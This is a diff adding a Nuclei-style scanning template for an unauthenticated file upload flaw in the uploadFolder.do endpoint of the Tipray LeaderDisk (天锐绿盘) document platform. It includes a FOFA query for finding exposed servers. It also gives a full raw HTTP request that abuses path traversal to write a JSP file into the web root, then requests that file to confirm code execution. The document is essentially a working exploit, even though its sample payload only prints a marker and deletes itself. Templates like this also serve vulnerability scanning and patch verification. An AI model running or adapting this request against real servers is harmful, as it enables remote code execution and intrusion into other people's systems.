@@ -1,0 +1,42 @@
+id: tianrui-lvdpan-uploadfolder-do-arbitrary-file-upload
+info:
+  name: 天锐绿盘云文档安全管理平台 uploadFolder.do 任意文件上传
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk" || body="location.href=location.href+\"lddsm\"
+
+    天锐绿盘云文档安全管理平台的 uploadFolder.do 接口存在未授权的文件上传缺陷。攻击者可通过该接口上传恶意文件至服务器，进而执行任意代码，导致系统权限沦陷。此漏洞使得远程攻击者能够在未授权状态下实施持久化入侵并横向渗透内网。
+  tags: 天锐绿盘云文档安全管理平台
+
+flow: http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2yTv7wNpLm
+
+    ------WebKitFormBoundaryXqK9dR2yTv7wNpLm
+    Content-Disposition: form-data; name="file"; filename="NTest.jsp"
+    Content-Type: image/png
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - NdayTest
